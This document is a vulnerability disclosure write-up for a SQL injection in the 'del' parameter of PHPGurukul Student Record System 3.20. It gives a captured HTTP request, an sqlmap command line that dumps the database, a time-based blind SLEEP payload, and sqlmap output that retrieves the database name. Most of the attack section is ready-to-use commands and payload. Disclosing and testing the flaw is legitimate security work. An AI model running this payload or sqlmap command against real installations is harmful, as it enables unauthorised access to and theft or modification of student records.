# Student Record System - SQL Injection - 3
+ **Exploit Title:** Student Record System - SQL Injection - 3
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/student-record-system-php/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7216
+ **Version:** 3.20
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Student Record Managment System 3.20 allows SQL Injection via the 'del' parameter in "http://localhost/studentrecordms/manage-courses.php?del=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/studentrecordms/manage-courses.php"
+ Then click delete course button. 
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /studentrecordms/manage-courses.php?del=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'del' parameter to dump the database.
```
sqlmap -r r.txt -p del --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: del (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: del=1' AND (SELECT 4962 FROM (SELECT(SLEEP(5)))mrQr)-- dRLm
---
[01:40:43] [INFO] the back-end DBMS is MySQL
[01:40:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:40:48] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[01:40:48] [INFO] retrieved: 
[01:40:58] [INFO] adjusting time delay to 1 second due to good response times
studentrecorddb
current database: 'studentrecorddb'
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 084512](https://github.com/BurakSevben/CVEs/assets/117217689/d424d4ac-1dd5-4b55-bb84-efca0bd0d26f)
